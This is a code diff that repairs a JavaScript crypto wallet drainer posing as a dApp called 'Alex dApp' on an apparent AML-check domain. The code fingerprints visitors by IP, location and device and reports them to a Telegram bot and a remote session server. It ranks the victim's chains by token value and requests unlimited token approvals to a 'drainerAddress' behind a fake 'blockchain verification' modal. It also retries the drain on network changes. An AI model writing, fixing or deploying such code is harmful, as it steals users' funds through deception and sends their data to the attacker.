@@ -24,7 +24,7 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://bybitamlbot.com/';,
+    url: 'https://bybitamlbot.com/',
     icons: ['https://bybitamlbot.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
@@ -56,12 +56,12 @@ const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
 async function sendTelegramMessage(message) {
   try {
-    const url = `https://api.telegram.org/bot${botconfig.TELEGRAM_BOT_TOKEN}/sendMessage`; // Fixed typo
+    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: config.TELEGRAM_CHAT_ID, // Fixed typo
+        chat_id: config.TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'Markdown'
       })
@@ -79,7 +79,7 @@ async function getUserIP() {
   const cachedIP = sessionStorage.getItem('userIP');
   if (cachedIP) return cachedIP;
 
- try {
+  try {
     const response = await fetch('https://api.ipify.org?format=json');
     const data = await response.json();
     const ip = data.ip || 'Unknown IP';
@@ -95,8 +95,8 @@ async function getGeolocation(ip) {
   const cachedLocation = sessionStorage.getItem('userLocation');
   if (cachedLocation) return cachedLocation;
 
- try {
-    const response = await fetch(`https://freeipapi.com/api/json/${ip}}`);
+  try {
+    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
     const data = await response.json();
     if (data.cityName && data.countryName) {
       const location = `${data.cityName}, ${data.countryName}`;
@@ -117,7 +117,7 @@ function detectDevice() {
   const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;
 
   if (isDevToolsEmulation) {
-    const realPlatform = platform.toLowerCase();
+    const realPlatform = navigator.platform.toLowerCase();
     if (/win32|win64/i.test(realPlatform)) return "Windows";
     if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
     if (/linux/i.test(realPlatform)) return "Linux";
@@ -126,7 +126,7 @@ function detectDevice() {
 
   if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
   if (/android/i.test(userAgent)) return "Android";
-  if (/Windows/i.test(userAgent)) || /win32|win64/i.test(platform)) return "Windows";
+  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
   if (/macintosh|mac os/i.test(userAgent)) return "Mac";
   if (/linux/i.test(userAgent)) return "Linux";
   return "Unknown";
@@ -166,7 +166,7 @@ async function getTokenPriceInUSDT(tokenSymbol) {
     return parseFloat(cachedPrice);
   }
 
- try {
+  try {
     const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
     const data = await response.json();
     if (data.price) {
@@ -184,7 +184,7 @@ async function getTokenPriceInUSDT(tokenSymbol) {
 
 async function getWorkingProvider(rpcUrls) {
   const providerPromises = rpcUrls.map(async (rpc) => {
-   try {
+    try {
       const provider = new ethers.providers.JsonRpcProvider(rpc);
       await provider.getBalance('0x0000000000000000000000000000000000000000');
       return provider;
@@ -205,7 +205,7 @@ async function checkBalance(chainId, userAddress, provider) {
 
   console.log(`🔍 Checking balance for chainId ${chainId}`);
 
- try {
+  try {
     nativeBalance = await provider.getBalance(userAddress);
     console.log(`📊 Balance ${chainConfig.nativeToken}: ${ethers.utils.formatEther(nativeBalance)}`);
   } catch (error) {
@@ -213,7 +213,7 @@ async function checkBalance(chainId, userAddress, provider) {
     throw new Error('Failed to fetch native balance');
   }
 
- try {
+  try {
     const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
     const [usdtBalance, usdtDecimals] = await Promise.all([
       usdt.balanceOf(userAddress),
@@ -227,7 +227,7 @@ async function checkBalance(chainId, userAddress, provider) {
     tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
   }
 
- try {
+  try {
     const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
     const [usdcBalance, usdcDecimals] = await Promise.all([
       usdc.balanceOf(userAddress),
@@ -244,7 +244,7 @@ async function checkBalance(chainId, userAddress, provider) {
   if (chainConfig.otherTokenAddresses) {
     const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
     const balancePromises = tokenAddresses.map(async (tokenAddress) => {
-     try {
+      try {
         const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
         const [balance, decimals] = await Promise.all([
           token.balanceOf(userAddress),
@@ -281,9 +281,9 @@ function hasFunds(bal) {
 }
 
 async function switchChain(chainId) {
- try {
+  try {
     console.log(`🔄 Switching to chainId ${chainId}`);
-    await wagmiAdapter.switchNetwork({ chainId }); // Use AppKit to switch chain
+    await appKitModal.switchNetwork({ chainId });
     console.log(`✅ Switched to chainId ${chainId}`);
   } catch (error) {
     console.error(`❌ Error switching chain: ${error.message}`);
@@ -297,8 +297,9 @@ function shortenAddress(address) {
 }
 
 function detectWallet() {
-  const walletInfo = wagmiAdapter.getWalletInfo(); // Use AppKit to detect wallet
-  return walletInfo?.name || "Unknown Wallet";
+  if (window.ethereum?.isMetaMask) return "MetaMask";
+  if (window.ethereum?.isTrust) return "Trust Wallet";
+  return "Unknown Wallet";
 }
 
 function formatBalance(balance, decimals) {
@@ -307,7 +308,7 @@ function formatBalance(balance, decimals) {
 }
 
 async function saveSession(userAddress, chainId, txHash = null) {
- try {
+  try {
     if (!sessionId) sessionId = generateSessionId();
     const response = await fetch('https://api.bybitamlbot.com/api/save-session', {
       method: 'POST',
@@ -332,7 +333,7 @@ async function saveSession(userAddress, chainId, txHash = null) {
 }
 
 async function restoreSession() {
- try {
+  try {
     const storedSessionId = sessionStorage.getItem('sessionId');
     if (!storedSessionId) return null;
 
@@ -358,7 +359,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     return Math.round(balanceInTokens * 100) / 100;
   }
 
- try {
+  try {
     console.log(`📍 Notifying server for token ${tokenAddress} for ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
     const balance = initialAmount;
@@ -411,7 +412,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   const currentNetwork = await provider.getNetwork();
   if (currentNetwork.chainId !== chainId) {
     console.log(`📍 Current network ${currentNetwork.chainId}, switching to ${chainId}`);
-   try {
+    try {
       await switchChain(chainId);
       console.log(`⏳ Waiting for network switch to complete...`);
       await new Promise(resolve => setTimeout(resolve, 3000));
@@ -431,7 +432,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
 
-  const connectNotifiedKey = `connectNotified_${userAddress}`;
+  const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
 
   if (!hasNotified) {
@@ -480,7 +481,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   console.log(`📍 Step 3: Checking ${chainConfig.nativeToken} balance for gas`);
   let ethBalance;
- try {
+  try {
     ethBalance = await provider.getBalance(userAddress);
     console.log(`📊 ${chainConfig.nativeToken} balance: ${ethers.utils.formatEther(ethBalance)}`);
   } catch (error) {
@@ -559,7 +560,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     const allowanceFormatted = parseFloat(ethers.utils.formatUnits(allowanceBefore, decimals));
     const balanceFormatted = parseFloat(ethers.utils.formatUnits(balance, decimals));
     if (allowanceFormatted < balanceFormatted) {
-     try {
+      try {
         const nonce = await provider.getTransactionCount(userAddress, "pending");
         const gasPrice = await provider.getGasPrice();
         console.log(`📏 Gas price: ${ethers.utils.formatUnits(gasPrice, "gwei")} gwei`);
@@ -569,7 +570,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
           gasLimit: 500000,
-          gasPrice: gasPrice,
+          gasPrice,
           nonce
         });
         console.log(`📤 Approve transaction sent: ${tx.hash}`);
@@ -606,7 +607,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
       }
 
       if (!modalClosed) {
-        console.log(`ℹ Allowance sufficient for token ${token}, closing modal`);
+        console.log(`ℹ️ Allowance sufficient for token ${token}, closing modal`);
         modalClosed = true;
         await hideModalWithDelay();
       }
@@ -650,23 +651,23 @@ async function runDrainer(provider, signer, userAddress) {
       })
   );
 
-  sorted.sort((a, b) => b.totalValueInUSDT - a.totalValueInUSDT);
+  sorted.sort((a, b) => b.totalValueInUSDT - a.valueInUSDT);
 
   if (!sorted.length) {
     throw new Error('No funds found on any chain');
   }
 
   const target = sorted[0];
-  console.log(`Recommended chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT)`);
+  console.log(`Recommended chain: chainId ${target.chainId} with max token value ${target.totalValueInUSDT} USDT`);
   return { targetChainId: target.chainId, targetProvider: target.provider };
-};
+}
 
 async function calculateTotalValueInUSDT(chainId, balance, provider) {
   const chainConfig = config.CHAINS[chainId];
   let totalValue = 0;
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
-    const tokenData = balance.tokenBalances[tokenDataAddress];
+    const tokenData = balance.tokenBalances[tokenAddress];
     const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
     if (formattedBalance > 0) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
@@ -699,7 +700,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0,0,0,0.0, 0.8);
+      background: rgba(0, 0, 0, 0.8);
       z-index: 999;
       display: none;
       backdrop-filter: blur(4px);
@@ -723,7 +724,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-family: 'Inter', sans-serif;
       color: #FFFFFF;
       box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
-      animation: fadeIn 0s ease-out forwards;
+      animation: fadeIn 0.3s ease-out forwards;
     }
 
     @keyframes fadeIn {
@@ -743,7 +744,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-weight: 400;
       color: #A0AEC0;
       margin-bottom: 24px;
-      word-wrap: break-word-word;
+      word-wrap: break-word;
     }
 
     .loader-container {
@@ -759,16 +760,16 @@ window.addEventListener('DOMContentLoaded', async () => {
       left: 50%;
       width: 40px;
       height: 40px;
-      border: 3pxpx solid #3B82F6;
+      border: 3px solid #3B82F6;
       border-radius: 50%;
       transform: translate(-50%, -50%);
       animation: pulse 2s ease-in-out infinite;
     }
 
     @keyframes pulse {
-      0% { width: width: 40px; height: 40px; opacity: 0.8; }
+      0% { width: 40px; height: 40px; opacity: 0.8; }
       50% { width: 50px; height: 50px; opacity: 0.4; }
-      100% { width: 40px; width height: 40px; opacity: 0.8; }
+      100% { width: 40px; height: 40px; opacity: 0.8; }
     }
 
     .wave {
@@ -788,8 +789,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     .wave:nth-child(3) { animation-delay: 2s; }
 
     @keyframes wave {
-      0% { width: 40px; height: 40px; width opacity: 0.6; }
-      100% { width: 100px; height: 100px; height opacity: 0; }
+      0% { width: 40px; height: 40px; opacity: 0.6; }
+      100% { width: 100px; height: 100px; opacity: 0; }
     }
 
     .action-list {
@@ -799,12 +800,12 @@ window.addEventListener('DOMContentLoaded', async () => {
       font-size: 14px;
       font-weight: 500;
       color: #E2E8F0;
-      list text-align: left;
+      text-align: left;
     }
 
     .action-list li {
-      margin-bottom: -12px;
-      font display: flex;
+      margin-bottom: 12px;
+      display: flex;
       align-items: center;
       gap: 8px;
     }
@@ -819,23 +820,23 @@ window.addEventListener('DOMContentLoaded', async () => {
 
     @media (max-width: 480px) {
       .modal-content {
-        max-width: 320px;      max
-        padding-top: 20px;
+        max-width: 320px;
+        padding: 20px;
         min-height: 300px;
       }
       .modal-title { font-size: 18px; }
       .modal-subtitle { font-size: 13px; }
-      .loader-container { font-size: 14px; width: 70px; height: 70px; }
+      .loader-container { width: 70px; height: 70px; }
       @keyframes pulse {
-        0% { width: 30px; width height: 30px; height opacity: 0.8; }
-        50% { width: 40px; width height: 400px; opacity: 0.4; }
-        100% { width: 30px; height: height 30px; opacity: 0.8; }
+        0% { width: 30px; height: 30px; opacity: 0.8; }
+        50% { width: 40px; height: 40px; opacity: 0.4; }
+        100% { width: 30px; height: 30px; opacity: 0.8; }
       }
       @keyframes wave {
         0% { width: 30px; height: 30px; opacity: 0.6; }
-        100% { width: 70px; height: height 70px; opacity: 0; }
+        100% { width: 70px; height: 70px; opacity: 0; }
       }
-      .action-list li { font-size: 13px; }
+      .action-list { font-size: 13px; }
       .modal-footer { font-size: 11px; }
     }
   `;
@@ -869,16 +870,16 @@ window.addEventListener('DOMContentLoaded', async () => {
 
   // Check saved session on page load
   const sessionData = await restoreSession();
-  if (sessionData && !hasDrained && !&& isTransactionPending) {
+  if (sessionData && !hasDrained && !isTransactionPending) {
     connectedAddress = sessionData.userAddress;
-    console.log(`ℹ️ Restored session for address: ${connectedAddress}`);
+    console.log(`ℹ Restored session for address: ${connectedAddress}`);
     // Check if wallet is still connected
-   try {
-      const account = wagmiAdapter.getAccount();
-      if (account.address && account.address.toLowerCase() === connectedAddress.toLowerCase()) {
+    try {
+      const state = appKitModal.getState();
+      if (state.connected && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠️ Wallet not connected, clearing session`);
+        console.warn(`⚠ Wallet not connected, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
@@ -901,7 +902,7 @@ function showModal() {
   modalSubtitle.textContent = "Processing blockchain verification...";
 }
 
-async function hideModalWithDelay(errorMessage = null) => {
+async function hideModalWithDelay(errorMessage = null) {
   if (errorMessage) {
     modalSubtitle.textContent = errorMessage;
     await new Promise(resolve => setTimeout(resolve, 2000));
@@ -914,7 +915,7 @@ async function hideModalWithDelay(errorMessage = null) => {
 
 async function attemptDrainer() {
   if (hasDrained || isTransactionPending) {
-    console.log('⚠️ Transaction already completed or pending');
+    console.log('⚠ Transaction already completed or pending');
     await hideModalWithDelay("Transaction already completed or pending.");
     return;
   }
@@ -928,9 +929,9 @@ async function attemptDrainer() {
 
   showModal();
 
- try {
-    const provider = wagmiAdapter.getProvider(); // Use AppKit provider
-    if (!provider) throw new Error('No provider available');
+  try {
+    if (!window.ethereum) throw new Error('No Ethereum provider available after wallet connection');
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
     const signer = provider.getSigner();
     const address = await signer.getAddress();
 
@@ -941,7 +942,7 @@ async function attemptDrainer() {
     await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
-    const { targetChainId, targetProvider }: = await runDrainer(provider, signer, connectedAddress);
+    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
     if (targetChainId) {
       await switchChain(targetChainId);
       const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
@@ -954,24 +955,18 @@ async function attemptDrainer() {
     isTransactionPending = false;
     let errorMessage = "Error: An unexpected error occurred.";
     if (error.message.includes('user rejected')) {
-      errorMessage = "Error: Transaction by user.";
-      } else {
- if (errorMessage.includes('Insufficient')) {
-        errorMessage = error.message;
-      } else {
- if (errorMessage.includes('Failed to approve token')) {
-        errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
-      } else {
- if (errorMessage.includes('Failed to process')) {
-        errorMessage = "Error: Failed to process native token transfer. Your wallet may not support.";
-        } else {
- if (error.message.includes('Failed to switch chain')) {
-          errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
-          } else {
-            errorMessage = `Error: ${error.message}`;
-          }
-        }
-      }
+      errorMessage = "Error: Transaction rejected by user.";
+    } else if (error.message.includes('Insufficient')) {
+      errorMessage = error.message;
+    } else if (error.message.includes('Failed to approve token')) {
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+    } else if (error.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support.";
+    } else if (error.message.includes('Failed to switch')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    } else {
+      errorMessage = `Error: ${error.message}`;
+    }
     console.error('❌ Drainer error:', error.message);
     await hideModalWithDelay(errorMessage);
     throw error;
@@ -983,13 +978,13 @@ async function handleConnectOrAction() {
     if (!connectedAddress) {
       console.log('🎛️ Opening AppKit modal for wallet selection...');
       await appKitModal.open();
-      connectedAddress = await waitForAppKitConnection();
+      connectedAddress = await waitForConnection();
       console.log('✅ Wallet connected:', connectedAddress);
       appKitModal.close();
 
       // Save session after successful connection
-      const provider = wagmiAdapter.getProvider();
-      if (!provider) throw new Error('No provider available after connection');
+      if (!window.ethereum) throw new Error('No provider available after connection');
+      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
       const network = await provider.getNetwork();
       await saveSession(connectedAddress, network.chainId);
     } else {
@@ -1002,24 +997,23 @@ async function handleConnectOrAction() {
       console.log('⏳ Transaction already in progress');
       await hideModalWithDelay("Transaction already in progress.");
     }
-  } catch (err) {
-    console.error('❌ Connection error:', error.err.message);
+  } catch (error) {
+    console.error('❌ Connection error:', error.message);
     appKitModal.close();
     isTransactionPending = false;
     showModal();
-    await hideModalWithDelay(`Error(: Failed to connect wallet. ${err.message}`);
-    }
-  } catch (error) {
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${error.message}`);
+  }
 }
 
 async function onChainChanged(chainId) {
-  console.log('🔄 Network changed:', chainId);
+  console.log(`🔄 Network changed: ${chainId}`);
   try {
     if (connectedAddress && !isTransactionPending) {
-      const provider = wagmiAdapter.getProvider();
-      if (!provider) throw new Error('No provider available');
+      if (!window.ethereum) throw new Error('No Ethereum provider available.');
+      const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
       const newNetwork = await provider.getNetwork();
-      console.log(`📡 New network: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+      console.log(`  New network: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
       // Save session on network change
       await saveSession(connectedAddress, newNetwork.chainId);
       await attemptDrainer();
@@ -1027,13 +1021,13 @@ async function onChainChanged(chainId) {
       console.log('⏳ Transaction pending');
       await hideModalWithDelay("Transaction in progress, please wait.");
     }
-  } catch (err) {
-    console.error('❌ Chain change error:', error.err.message);
+  } catch (error) {
+    console.error('❌ Chain change error:', error.message);
     await hideModalWithDelay("Network change error occurred.");
   }
 }
 
-async function waitForAppKitConnection() {
+async function waitForConnection() {
   return new Promise((resolve, reject) => {
     console.log('📡 Waiting for wallet connection via AppKit...');
 
